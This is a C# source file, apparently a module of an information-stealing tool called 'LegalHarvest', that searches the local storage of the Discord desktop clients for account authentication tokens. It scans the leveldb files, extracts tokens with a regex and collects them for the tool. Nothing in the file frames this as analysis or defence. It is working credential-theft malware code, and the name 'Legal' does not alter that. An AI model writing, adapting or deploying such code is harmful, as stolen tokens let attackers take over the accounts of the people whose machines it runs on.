using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using System.Text.RegularExpressions;

namespace LegalHarvest.Modules
{
    public class DiscordAllTokensModule : ICollectorModule
    {
        public string ModuleName => "DiscordAllTokens";
        public bool CanExecute() => true;

        private readonly string[] discordPaths = { "discord", "discordcanary", "discordptb" };

        public List<CollectedItem> Collect()
        {
            var items = new List<CollectedItem>();
            string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

            foreach (string client in discordPaths)
            {
                string leveldb = Path.Combine(appData, client, "Local Storage", "leveldb");
                if (!Directory.Exists(leveldb)) continue;

                foreach (string file in Directory.GetFiles(leveldb, "*.ldb"))
                {
                    string content = File.ReadAllText(file, Encoding.UTF8);
                    Match match = Regex.Match(content, @"[\w-]{24}\.[\w-]{6}\.[\w-]{27}");
                    if (match.Success)
                    {
                        items.Add(new CollectedItem { Category = $"Discord_{client}", Name = "Token", Value = match.Value, Timestamp = DateTime.Now });
                        return items;
                    }
                }
            }
            return items;
        }
    }
}
